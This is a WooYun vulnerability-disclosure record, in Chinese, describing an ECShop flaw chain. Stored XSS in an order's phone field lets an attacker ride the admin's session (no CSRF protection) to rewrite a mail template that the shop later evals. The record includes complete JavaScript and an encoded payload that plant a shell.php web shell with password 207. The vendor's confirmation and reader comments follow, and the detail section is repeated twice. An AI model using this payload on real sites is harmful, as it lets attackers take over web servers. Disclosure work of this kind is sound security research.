{"id": 15929, "wybug_id": "wooyun-2012-013680", "wybug_title": "ecshop csrf getshell", "wybug_corp": "ShopEx", "wybug_author": "猪头子", "wybug_date": "2012-10-21 21:03", "wybug_open_date": "2012-12-05 21:04", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-10-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-10-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-10-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-11-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-11-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-12-05：\t细节向公众公开  简要描述： 吐槽下ecshop后台安全性真的太弱了。。前台组合xss来猥琐的让管理员后台getshell 详细说明：  0x0\t后台getshell    在includes/cls_template.php fetch函数\n/**     * 处理模板文件     *     * @access  public     * @param   string      $filename     * @param   sting      $cache_id     *     * @return  sring     */    function fetch($filename, $cache_id = '')    {        if (!$this->_seterror)        {            error_reporting(E_ALL ^ E_NOTICE);        }        $this->_seterror++;\t\t        //若$filename以str:开头则执行下面的语句        if (strncmp($filename,'str:', 4) == 0)        {            $out = $this->_eval($this->fetch_str(substr($filename, 4)));        }\n    可以看到如果$filename以\"str:\"开头那么就调用_eval()函数执行\"str:\"后面的代码, 不过在执行之前系统调用fetch_str函数进行字符查找和替换。　　_eval():\nfunction _eval($content)    {        ob_start();        eval('?' . '>' . trim($content));        $content = ob_get_contents();        ob_end_clean();        return $content;　　}\n\n/**     * 处理字符串函数     *     * @access  public     * @param   string     $source     *     * @return  string     */    function fetch_str($source)    {        if (!defined('ECS_ADMIN'))        {            $source = $this->smarty_prefilter_preCompile($source);        }        $source = preg_replace(\"/<\\?[^><]+\\?>|<\\%[^><]+\\%>|<script[^>]+language[^>]*=[^>]*php[^>]*>[^><]*<\\/script\\s*>/iU\", \"\", $source);        return preg_replace(\"/{([^\\}\\{\\n]*)}/e\", \"\\$this->select('\\\\1');\", $source);　　}\n    过滤了php语言的标记。    现在需要查看有哪些代码调用了这个函数，找到了这段代码：wholesale.php\n　　/*------------------------------------------------------ */　　//-- 提交订单　　/*------------------------------------------------------ */　　elseif ($_REQUEST['act'] == 'submit_order')　　{　　    include_once(ROOT_PATH . 'includes/lib_order.php');　　... ... ... ... ... ... ... ... ... ... ... ... ...　　... ... ... ... ... ... ... ... ... ... ... ... ...　　    /* 给商家发邮件 */　　    if ($_CFG['service_email'] != '')　　    {　　        $tpl = get_mail_template('remind_of_new_order');　　    ... ... ... ... ... ... ... ... ... ... ... ...　　    ... ... ... ... ... ... ... ... ... ... ... ...　　$content = $smarty->fetch('str:' . $tpl['template_content']);　　        ... ... ... ... ... ... ... ... ... ... ... ...　　}\n　　在提交订单的地方看到了代码调用了get_mail_template()获得remind_of_new_order模板的内容，然后放入到fetch中执行，如果可以控制remind_of_new_order模板的内容那就可以让ecshop执行我们的命令了。　　在后台可以在模板管理中找到邮件模板，更改remind_of_new_order的内容为\"{$phpinfo()'];phpinfo();/*}\"，然后在调试中可以看到代码被替换成了\"<?php echo $this->_var['phpinfo()'];phpinfo();/*']; ?>\"，代码成功执行。\n\n0x1 前台xss　　前台在有些地方过滤不够充分，导致用户可以构造恶意javascript完成对后台管理员的xss攻击。　　注册用户以后随便买个东西，收货人信息里电话一栏只有本地的客户端检查，而没有后端过滤，容易招到xss攻击。 \n\n0x2 xss+后台getshell　　由于没有csrf的防护，因此可以前台xss到后台并让管理员帮我们getshell。　　以下是实现getshell的js：\nVar Shelldata='subject=%C3%DC%C2%EB%D5%D2%BB%D8&mail_type=0&tpl=1&content=%7B%24user_name%27%5D%3Bfile_put_contents%28base64_decode%28%27c2hlbGwucGhw%27%29%2Cbase64_decode%28%27PD9waHAgQGV2YWwoJF9QT1NUWycyMDcnXSk7Pz4%3D%27%29%29%3Becho+%24var%5B%27%24user_name%7D%0D%0A%3C%2Fp%3E%0D%0A%3Cp%3E%7B%24user_name%7D%C4%FA%BA%C3%A3%A1%3Cbr+%2F%3E%0D%0A%3Cbr+%2F%3E%0D%0A%C4%FA%D2%D1%BE%AD%BD%F8%D0%D0%C1%CB%C3%DC%C2%EB%D6%D8%D6%C3%B5%C4%B2%D9%D7%F7%A3%AC%C7%EB%B5%E3%BB%F7%D2%D4%CF%C2%C1%B4%BD%D3%28%BB%F2%D5%DF%B8%B4%D6%C6%B5%BD%C4%FA%B5%C4%E4%AF%C0%C0%C6%F7%29%3A%3Cbr+%2F%3E%0D%0A%3Cbr+%2F%3E%0D%0A%3Ca+target%3D%22_blank%22+href%3D%22%7B%24reset_email%7D%22%3E%7B%24reset_email%7D%3C%2Fa%3E%3Cbr+%2F%3E%0D%0A%3Cbr+%2F%3E%0D%0A%D2%D4%C8%B7%C8%CF%C4%FA%B5%C4%D0%C2%C3%DC%C2%EB%D6%D8%D6%C3%B2%D9%D7%F7%A3%A1%3Cbr+%2F%3E%0D%0A%3Cbr+%2F%3E%0D%0A%7B%24shop_name%7D%3Cbr+%2F%3E%0D%0A%7B%24send_date%7D%3C%2Fp%3E'; try{ var xml = window.XMLHttpRequest ? (new XMLHttpRequest()) : (new ActiveXObject('Microsoft.XMLHTTP')); xml.open(\"POST\",'/ecshop/upload/admin/mail_template.php?act=save_template',false); xml.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xml.onreadystatechange = function(){if(xml.readyState == 4){}}; xml.send(Shelldata); }catch(e){}\n    上传这个js的图片并引用或者直接从外部网站引用都可以。为了测试方便，从本地引用\n\n　　最后提交订单，管理员访问该订单，用户找回密码，就会在根目录生成shell.php，密码207.　　　　管理员访问订单前的找回密码模板：\n\n　　管理员查看订单\n\n　　管理员访问订单之后的邮件模板\n\n　　最后用户前台找回密码，根目录下生成一句话shell.php\n\n   漏洞证明：  0x0\t后台getshell    在includes/cls_template.php fetch函数\n/**     * 处理模板文件     *     * @access  public     * @param   string      $filename     * @param   sting      $cache_id     *     * @return  sring     */    function fetch($filename, $cache_id = '')    {        if (!$this->_seterror)        {            error_reporting(E_ALL ^ E_NOTICE);        }        $this->_seterror++;\t\t        //若$filename以str:开头则执行下面的语句        if (strncmp($filename,'str:', 4) == 0)        {            $out = $this->_eval($this->fetch_str(substr($filename, 4)));        }\n    可以看到如果$filename以\"str:\"开头那么就调用_eval()函数执行\"str:\"后面的代码, 不过在执行之前系统调用fetch_str函数进行字符查找和替换。　　_eval():\nfunction _eval($content)    {        ob_start();        eval('?' . '>' . trim($content));        $content = ob_get_contents();        ob_end_clean();        return $content;　　}\n\n/**     * 处理字符串函数     *     * @access  public     * @param   string     $source     *     * @return  string     */    function fetch_str($source)    {        if (!defined('ECS_ADMIN'))        {            $source = $this->smarty_prefilter_preCompile($source);        }        $source = preg_replace(\"/<\\?[^><]+\\?>|<\\%[^><]+\\%>|<script[^>]+language[^>]*=[^>]*php[^>]*>[^><]*<\\/script\\s*>/iU\", \"\", $source);        return preg_replace(\"/{([^\\}\\{\\n]*)}/e\", \"\\$this->select('\\\\1');\", $source);　　}\n    过滤了php语言的标记。    现在需要查看有哪些代码调用了这个函数，找到了这段代码：wholesale.php\n　　/*------------------------------------------------------ */　　//-- 提交订单　　/*------------------------------------------------------ */　　elseif ($_REQUEST['act'] == 'submit_order')　　{　　    include_once(ROOT_PATH . 'includes/lib_order.php');　　... ... ... ... ... ... ... ... ... ... ... ... ...　　... ... ... ... ... ... ... ... ... ... ... ... ...　　    /* 给商家发邮件 */　　    if ($_CFG['service_email'] != '')　　    {　　        $tpl = get_mail_template('remind_of_new_order');　　    ... ... ... ... ... ... ... ... ... ... ... ...　　    ... ... ... ... ... ... ... ... ... ... ... ...　　$content = $smarty->fetch('str:' . $tpl['template_content']);　　        ... ... ... ... ... ... ... ... ... ... ... ...　　}\n　　在提交订单的地方看到了代码调用了get_mail_template()获得remind_of_new_order模板的内容，然后放入到fetch中执行，如果可以控制remind_of_new_order模板的内容那就可以让ecshop执行我们的命令了。　　在后台可以在模板管理中找到邮件模板，更改remind_of_new_order的内容为\"{$phpinfo()'];phpinfo();/*}\"，然后在调试中可以看到代码被替换成了\"<?php echo $this->_var['phpinfo()'];phpinfo();/*']; ?>\"，代码成功执行。\n\n0x1 前台xss　　前台在有些地方过滤不够充分，导致用户可以构造恶意javascript完成对后台管理员的xss攻击。　　注册用户以后随便买个东西，收货人信息里电话一栏只有本地的客户端检查，而没有后端过滤，容易招到xss攻击。 \n\n0x2 xss+后台getshell　　由于没有csrf的防护，因此可以前台xss到后台并让管理员帮我们getshell。　　以下是实现getshell的js：\nVar Shelldata='subject=%C3%DC%C2%EB%D5%D2%BB%D8&mail_type=0&tpl=1&content=%7B%24user_name%27%5D%3Bfile_put_contents%28base64_decode%28%27c2hlbGwucGhw%27%29%2Cbase64_decode%28%27PD9waHAgQGV2YWwoJF9QT1NUWycyMDcnXSk7Pz4%3D%27%29%29%3Becho+%24var%5B%27%24user_name%7D%0D%0A%3C%2Fp%3E%0D%0A%3Cp%3E%7B%24user_name%7D%C4%FA%BA%C3%A3%A1%3Cbr+%2F%3E%0D%0A%3Cbr+%2F%3E%0D%0A%C4%FA%D2%D1%BE%AD%BD%F8%D0%D0%C1%CB%C3%DC%C2%EB%D6%D8%D6%C3%B5%C4%B2%D9%D7%F7%A3%AC%C7%EB%B5%E3%BB%F7%D2%D4%CF%C2%C1%B4%BD%D3%28%BB%F2%D5%DF%B8%B4%D6%C6%B5%BD%C4%FA%B5%C4%E4%AF%C0%C0%C6%F7%29%3A%3Cbr+%2F%3E%0D%0A%3Cbr+%2F%3E%0D%0A%3Ca+target%3D%22_blank%22+href%3D%22%7B%24reset_email%7D%22%3E%7B%24reset_email%7D%3C%2Fa%3E%3Cbr+%2F%3E%0D%0A%3Cbr+%2F%3E%0D%0A%D2%D4%C8%B7%C8%CF%C4%FA%B5%C4%D0%C2%C3%DC%C2%EB%D6%D8%D6%C3%B2%D9%D7%F7%A3%A1%3Cbr+%2F%3E%0D%0A%3Cbr+%2F%3E%0D%0A%7B%24shop_name%7D%3Cbr+%2F%3E%0D%0A%7B%24send_date%7D%3C%2Fp%3E'; try{ var xml = window.XMLHttpRequest ? (new XMLHttpRequest()) : (new ActiveXObject('Microsoft.XMLHTTP')); xml.open(\"POST\",'/ecshop/upload/admin/mail_template.php?act=save_template',false); xml.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xml.onreadystatechange = function(){if(xml.readyState == 4){}}; xml.send(Shelldata); }catch(e){}\n    上传这个js的图片并引用或者直接从外部网站引用都可以。为了测试方便，从本地引用\n\n　　最后提交订单，管理员访问该订单，用户找回密码，就会在根目录生成shell.php，密码207.　　　　管理员访问订单前的找回密码模板：\n\n　　管理员查看订单\n\n　　管理员访问订单之后的邮件模板\n\n　　最后用户前台找回密码，根目录下生成一句话shell.php\n\n   修复方案：  过滤   版权声明：转载请注明来源 猪头子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2012-10-21 23:03 厂商回复： 非常感谢您为shopex信息安全做的贡献我们将尽快修复非常感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-10-21 21:51 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  这个碉堡了，求PM方法     \n     2012-10-21 22:57 |    \t\tsaline \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:32        | Focus On Web Secur1ty)\t\t \n  嘎嘎，膜拜挖掘漏洞的黑阔    \n     2012-10-21 23:35 |    \t\tx0ers \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:4        | 专注计算机：开机关机重启20年。)\t\t \n  是XSS呀，座等公开！    \n     2012-10-22 18:25 |    \t\tGrass \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:4        | s)\t\t \n  .....犀利了。这个，求公开    \n     2012-11-02 20:44 |    \t\tyy520 \t\t\t( 普通白帽子  |\t\t\t        Rank:139 漏洞数:12        )\t\t \n  真不错呀    \n     2012-11-11 16:39 |    \t\txiaokinghk \t\t\t( 实习白帽子  |\t\t\t        Rank:82 漏洞数:16        | 【DBA】)\t\t \n  前排围观。。。。思路不错    \n     2012-11-12 04:21 |    \t\t冰锋刺客 \t\t\t( 普通白帽子  |\t\t\t        Rank:113 漏洞数:14        | 请在监护人陪同下与本人交流)\t\t \n  犀利 啊 ！    \n     2012-11-23 22:50 |    \t\t猴子 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:5        | 我是一只骚猴子)\t\t \n  犀利    \n     2012-12-07 09:53 |    \t\tMissye \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | wu)\t\t \n  好    \n     2013-01-03 00:34 |    \t\tdiscovery \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:3        | www.google.com)\t\t \n  getshell 貌似没测试成功过，不过xss成功。    \n     2013-05-02 23:56 |    \t\thfy \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:3        | 打了个狗~)\t\t \n  猪头啊猪头~@猪头子    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}